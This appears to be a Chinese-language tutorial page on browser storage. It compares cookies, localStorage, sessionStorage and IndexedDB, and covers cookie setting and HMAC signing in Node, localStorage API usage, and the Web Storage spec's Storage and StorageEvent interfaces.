class="navbar__item navbar__link" label="设计模式" position="left" href="/docs/patterns/index">设计模式</a><a class="navbar__item navbar__link" label="算法" position="left" href="/docs/algo/index">算法</a><a class="navbar__item navbar__link" label="服务器" position="left" href="/docs/linux/index">服务器</a><a class="navbar__item navbar__link" label="计算机基础" position="left" href="/docs/base/h5">计算机基础</a><a class="navbar__item navbar__link" label="工具" position="left" href="/docs/other/mac">工具</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" label="博客" position="right" href="/blog">博客</a><a class="navbar__item navbar__link" label="关于" position="right" href="/docs/about">关于</a><a class="navbar__item navbar__link" href="https://github.com/banli17" label="GitHub" position="right" target="_blank" rel="noopener noreferrer">GitHub</a><div class="react-toggle displayOnlyInLargeViewport_1gtM"><div class="react-toggle-track"><div class="react-toggle-track-check"><span class="toggle_16vC moon_1N64"></span></div><div class="react-toggle-track-x"><span class="toggle_16vC sun_3CZP"></span></div></div><div class="react-toggle-thumb"></div><input type="checkbox" aria-label="Dark mode toggle" class="react-toggle-screenreader-only"/></div></div></div><div role="presentation" class="navbar__sidebar__backdrop"></div><div class="navbar__sidebar"><div class="navbar__sidebar__brand"><a aria-current="page" class="navbar__brand active" href="/"><img class="navbar__logo" src="/img/logo.svg" alt="板栗17的博客"/><strong>banli17.com</strong></a></div><div class="navbar__sidebar__items"><div class="menu"><ul class="menu__list"><li class="menu__list-item"><a class="menu__link" label="前端" position="left" href="/docs/f2e/html/index">前端</a></li><li class="menu__list-item"><a class="menu__link" label="源码笔记" position="left" href="/docs/source/jquery/event">源码笔记</a></li><li class="menu__list-item"><a class="menu__link" label="NodeJS" position="left" href="/docs/nodejs/util">NodeJS</a></li><li class="menu__list-item"><a class="menu__link" label="设计模式" position="left" href="/docs/patterns/index">设计模式</a></li><li class="menu__list-item"><a class="menu__link" label="算法" position="left" href="/docs/algo/index">算法</a></li><li class="menu__list-item"><a class="menu__link" label="服务器" position="left" href="/docs/linux/index">服务器</a></li><li class="menu__list-item"><a class="menu__link" label="计算机基础" position="left" href="/docs/base/h5">计算机基础</a></li><li class="menu__list-item"><a class="menu__link" label="工具" position="left" href="/docs/other/mac">工具</a></li><li class="menu__list-item"><a class="menu__link" label="博客" position="right" href="/blog">博客</a></li><li class="menu__list-item"><a class="menu__link" label="关于" position="right" href="/docs/about">关于</a></li><li class="menu__list-item"><a class="menu__link" href="https://github.com/banli17" label="GitHub" position="right" target="_blank" rel="noopener noreferrer">GitHub</a></li></ul></div></div></div></nav><div class="container container--fluid"><div class="row"><div class="col col--3"><div class="sidebar_Qb2S"><div class="menu menu--responsive"><button aria-label="Open Menu" class="button button--secondary button--sm menu__button" type="button"><svg class="sidebarMenuIcon_1uhT" xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 32 32" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><ul class="menu__list"><li class="menu__list-item"><a class="menu__link" href="#!">Html</a><ul class="menu__list"><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/html/index">HTML</a></li></ul></li><li class="menu__list-item"><a class="menu__link" href="#!">Css</a><ul class="menu__list"><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/css/index">css基础</a></li></ul></li><li class="menu__list-item"><a class="menu__link" href="#!">Javascript</a><ul class="menu__list"><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/javascript/grammer">语法</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/javascript/type">数据类型</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/javascript/oop">面向对象</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/javascript/module">模块化编程</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/javascript/async">异步编程</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/javascript/regexp">正则表达式</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/javascript/skill">高级技巧</a></li></ul></li><li class="menu__list-item"><a class="menu__link" href="#!">浏览器原理与API</a><ul class="menu__list"><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/browser/dom">DOM</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/browser/work">现代浏览器工作原理(翻译)</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/browser/eventloop">事件循环</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/browser/event">事件机制</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/browser/fetch">网络请求与表单</a></li><li class="menu__list-item"><a aria-current="page" class="menu__link menu__link--active" href="/docs/f2e/browser/storage">浏览器存储</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/browser/devtool">Chrome 开发者工具</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/browser/cache">浏览器缓存机制</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/browser/v8">V8 引擎原理</a></li></ul></li><li class="menu__list-item"><a class="menu__link" href="#!">其它</a><ul class="menu__list"><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/monitor/index">前端监控</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/test/index">前端测试与jest</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/safe/index">web 安全</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/performance/index">网站性能优化</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/webpack/basic/index">webpack (1): 官方文档总结</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/webpack/principle/index">webpack (2): 原理</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/react/index">React 知识点总结</a></li></ul></li><li class="menu__list-item"><a class="menu__link" href="#!">vue</a><ul class="menu__list"><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/vue/index">知识点总结</a></li><li class="menu__list-item"><a class="menu__link" href="/docs/f2e/vue/origin">原理分析</a></li></ul></li></ul></div></div></div><main class="col"><div><div class="padding-vert--lg"><div class="row"><div class="col"><div class="docItemContainer_1VCq"><header><h1 class="margin-bottom--lg">浏览器存储</h1></header><article><div class="markdown"><h2><a aria-hidden="true" class="anchor" id="简介"></a><a aria-hidden="true" class="hash-link" href="#简介">#</a>简介</h2><p>浏览器存储涉及的知识点有：</p><ul><li>localStorage</li><li>sessionStorage</li><li>indexedDB</li><li>Web SQL (目前有<a href="https://www.caniuse.com/#search=web%20sql">Chrome Edge Opera支持</a>)</li><li>Cookies</li></ul><p>先来看看对比：</p><table><thead><tr><th>名称</th><th>有效期</th><th>存储大小</th><th>与服务端通信</th></tr></thead><tbody><tr><td>cookie</td><td>一般服务端设置</td><td>4K</td><td>每次都携带在header中，对性能有影响</td></tr><tr><td>localStorage</td><td>不清理，长期有效</td><td>5M</td><td>无关</td></tr><tr><td>sessionStorage</td><td>页面关闭时失效</td><td>5M</td><td>无关</td></tr><tr><td>indexDB</td><td>不清理，长期有效</td><td>无限</td><td>无关</td></tr></tbody></table><h2><a aria-hidden="true" class="anchor" id="localstorage-和-sessionstorage"></a><a aria-hidden="true" class="hash-link" href="#localstorage-和-sessionstorage">#</a>localStorage 和 sessionStorage</h2><h2><a aria-hidden="true" class="anchor" id="cookie"></a><a aria-hidden="true" class="hash-link" href="#cookie">#</a>Cookie</h2><p>在浏览器端可以通过<code>document.cookie</code>来读取和设置cookie。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-js codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token dom variable" style="color:rgb(214, 222, 235)">document</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;key=value; domain=x; path=y; [expires|max-age]=z;&#x27;</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><h2><a aria-hidden="true" class="anchor" id="通过node操作cookie"></a><a aria-hidden="true" class="hash-link" href="#通过node操作cookie">#</a>通过Node操作cookie</h2><p>Node通过<code>res.setHeader(&#x27;Set-Cookie&#x27;)</code>设置cookie。</p><ul><li>设置httpOnly，前端获取不到，但是可以用浏览器修改，修改后也会发送给后台。</li><li><code>expires/max-age</code>设置后，浏览器每次刷新都会刷新过期时间。max-age是相对时间，expires是绝对时间。</li><li>path一般都不会设置，默认是/，可以起到限制cookie访问的作用。</li><li>domain: 默认只针对当前域名，可以设置为当前域名的上级域，.a.com表示a.a.com和b.a.com都可以共用cookie。</li></ul><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 设置一个cookie，写多次后面的setHeader会覆盖前面的</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">res</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">setHeader</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;Set-Cookie&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;name=zs&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 设置多个cookie，使用数组</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">res</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">setHeader</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;Set-Cookie&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;name=zs&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;age=12&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><h2><a aria-hidden="true" class="anchor" id="cookie安全和加盐"></a><a aria-hidden="true" class="hash-link" href="#cookie安全和加盐">#</a>cookie安全和加盐</h2><ul><li>因为前台可以修改cookie，需要防止它被篡改。</li><li>cookie一般不要存敏感信息，因为可以直接看到它。</li><li>不要单纯使用md5生成它，因为有可能通过撞库(彩虹表)就可以破解。</li><li>md5摘要算法，它是单向不可逆的，生成的字符串长度相同，不同的内容结果完全不同。</li></ul><p>所以一般使用加盐对cookie进行签名加密。所谓的盐就是一个密钥。密钥一般使用ssl生成。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token keyword" style="color:rgb(127, 219, 202)">const</span><span class="token plain"> crypto </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">require</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">&#x27;crypto</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">const</span><span class="token plain"> salt </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;eexxfjakfjldas&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">crypto</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">createHmac</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;sha256&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain">salt</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">update</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">value</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">digest</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;base64&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><h2><a aria-hidden="true" class="anchor" id="总结"></a><a aria-hidden="true" class="hash-link" href="#总结">#</a>总结</h2><p>1、localStorage和sessionStorage的区别？</p><ul><li>localStorage是永久存储，sessionStorage是窗口关闭时数据清空。</li><li>同时打开2个同域窗口，一个窗口设置的sessionStorage不影响另一个窗口的sessionStorage，而一个窗口设置的localStorage会影响另一个窗口的localStorage。</li></ul><p>2、localStorage在各个浏览器中的储存大小，以及在firefox里的限制，同域限制？</p><p>Chrome是2.5MB，Firefox和Opera是5MB，IE是10MB。其中，Firefox的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，在Firefox中，a.example.com和b.example.com共享5MB的存储空间。另外，与Cookie一样，它们也受同域限制。</p><p>3、设置、读取、删除、清空的方法？</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 设置</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token dom variable" style="color:rgb(214, 222, 235)">localStorage</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">setItem</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> value</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token dom variable" style="color:rgb(214, 222, 235)">localStorage</span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> value</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 读取</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token dom variable" style="color:rgb(214, 222, 235)">localStorage</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">getItem</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token dom variable" style="color:rgb(214, 222, 235)">localStorage</span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 删除某个字段</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token dom variable" style="color:rgb(214, 222, 235)">localStorage</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">removeItem</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">delete</span><span class="token plain"> </span><span class="token dom variable" style="color:rgb(214, 222, 235)">localStorage</span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 清空</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token dom variable" style="color:rgb(214, 222, 235)">localStorage</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">clear</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>4、如何遍历localStorage对象？</p><p>通过其length属性和key()方法。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token keyword" style="color:rgb(127, 219, 202)">for</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token keyword" style="color:rgb(127, 219, 202)">let</span><span class="token plain"> i</span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain">i</span><span class="token operator" style="color:rgb(127, 219, 202)">&lt;</span><span class="token dom variable" style="color:rgb(214, 222, 235)">localStorage</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">length</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain">i</span><span class="token operator" style="color:rgb(127, 219, 202)">++</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token console class-name" style="color:rgb(255, 203, 139)">console</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">log</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token dom variable" style="color:rgb(214, 222, 235)">localStorage</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>5、storage事件的使用方法和注意事项？event对象的关键属性？</p><ul><li>event.key</li><li>event.oldValue</li><li>event.newValue</li><li>event.url：storage改变的那个文档的url</li><li>event.storageArea：被影响的storage对象</li></ul><h2><a aria-hidden="true" class="anchor" id="深入：web-storage规范解读"></a><a aria-hidden="true" class="hash-link" href="#深入：web-storage规范解读">#</a>深入：web storage规范解读</h2><ul><li>原文：<a href="https://html.spec.whatwg.org/multipage/webstorage.html">https://html.spec.whatwg.org/multipage/webstorage.html</a></li></ul><p>web storage规范引入了2种和cookie相似的机制，用于客户端存储键值对数据。</p><ol><li>sessionStorage，是为单个事务设计，可以在不同窗口执行多个事务。也就是说每个窗口的sessionStorage是独立的、互不影响。cookie就不能这样，它是同域公用的，一个窗口可以读取另一个窗口的cookie。</li></ol><p>实例是用户打开2个窗口买票，如果用cookie可能会买2张相同的票。而使用sessionStorage只需要：</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-html codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token tag punctuation" style="color:rgb(199, 146, 234)">&lt;</span><span class="token tag" style="color:rgb(127, 219, 202)">label</span><span class="token tag punctuation" style="color:rgb(199, 146, 234)">&gt;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"> </span><span class="token tag punctuation" style="color:rgb(199, 146, 234)">&lt;</span><span class="token tag" style="color:rgb(127, 219, 202)">input</span><span class="token tag" style="color:rgb(127, 219, 202)"> </span><span class="token tag attr-name" style="color:rgb(173, 219, 103);font-style:italic">type</span><span class="token tag attr-value punctuation" style="color:rgb(199, 146, 234)">=</span><span class="token tag attr-value punctuation" style="color:rgb(199, 146, 234)">&quot;</span><span class="token tag attr-value" style="color:rgb(127, 219, 202)">checkbox</span><span class="token tag attr-value punctuation" style="color:rgb(199, 146, 234)">&quot;</span><span class="token tag" style="color:rgb(127, 219, 202)"> </span><span class="token tag attr-name" style="color:rgb(173, 219, 103);font-style:italic">onchange</span><span class="token tag attr-value punctuation" style="color:rgb(199, 146, 234)">=</span><span class="token tag attr-value punctuation" style="color:rgb(199, 146, 234)">&quot;</span><span class="token tag attr-value" style="color:rgb(127, 219, 202)">sessionStorage.insurance = checked ? &#x27;true&#x27; : &#x27;&#x27;</span><span class="token tag attr-value punctuation" style="color:rgb(199, 146, 234)">&quot;</span><span class="token tag punctuation" style="color:rgb(199, 146, 234)">&gt;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  I want insurance on this trip.</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(199, 146, 234)">&lt;/</span><span class="token tag" style="color:rgb(127, 219, 202)">label</span><span class="token tag punctuation" style="color:rgb(199, 146, 234)">&gt;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">if (sessionStorage.insurance) { ... }</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>因为每个窗口都有一个单独的sessionStorage，所以直接判断就行。</p><ol start="2"><li>localStorage是为跨多窗口存储设计的，并且持续时间不只是当前会话，而且出于性能考虑，允许存储大容量数据，比如用户编写的文档。</li></ol><p>同样，cookie不能很好处理这些问题。因为它们会随每次请求一起传输。</p><p>Storage接口</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token maybe-class-name">Exposed</span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token maybe-class-name">Window</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">interface</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(255, 203, 139)">Storage</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  readonly attribute unsigned long length</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token maybe-class-name">DOMString</span><span class="token operator" style="color:rgb(127, 219, 202)">?</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">unsigned long index</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  getter </span><span class="token maybe-class-name">DOMString</span><span class="token operator" style="color:rgb(127, 219, 202)">?</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">getItem</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token maybe-class-name">DOMString</span><span class="token plain"> key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  setter </span><span class="token keyword" style="color:rgb(127, 219, 202)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">setItem</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token maybe-class-name">DOMString</span><span class="token plain"> key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token maybe-class-name">DOMString</span><span class="token plain"> value</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  deleter </span><span class="token keyword" style="color:rgb(127, 219, 202)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">removeItem</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token maybe-class-name">DOMString</span><span class="token plain"> key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">clear</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>每个Storage对象都提供对键值对列表的访问，key可以是任意字符串，包括空字符串。值也是字符串。</p><ul><li>storage.length</li><li>storage.key(n)：返回列表中第n个键的名称。n如果超出，则返回null</li><li>value = storage.getItem(key) 或 value = storage<!-- -->[key]<!-- -->。没有则返回null</li><li>storage.setItem(key, value) 或 storage<!-- -->[key]<!-- --> = value。如果用户禁止存储或超出大小限制，则设置可能错误，抛出DOMException异常。</li><li>storage.removeItem(key) 或 delete storage<!-- -->[key]</li><li>storage.clear() </li></ul><p>StorageEvent接口</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">[Exposed=Window,</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"> Constructor(DOMString type, optional StorageEventInit eventInitDict)]</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">interface StorageEvent : Event {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  readonly attribute DOMString? key;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  readonly attribute DOMString? oldValue;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  readonly attribute DOMString? newValue;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  readonly attribute USVString url;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  readonly attribute Storage? storageArea;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">};</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">dictionary StorageEventInit : EventInit {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  DOMString? key = null;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  DOMString? oldValue = null;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  DOMString? newValue = null;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  USVString url = &quot;&quot;;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  Storage? storageArea = null;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">};</span></div></pre><button type="button" aria-label="Copy code to clipboard" 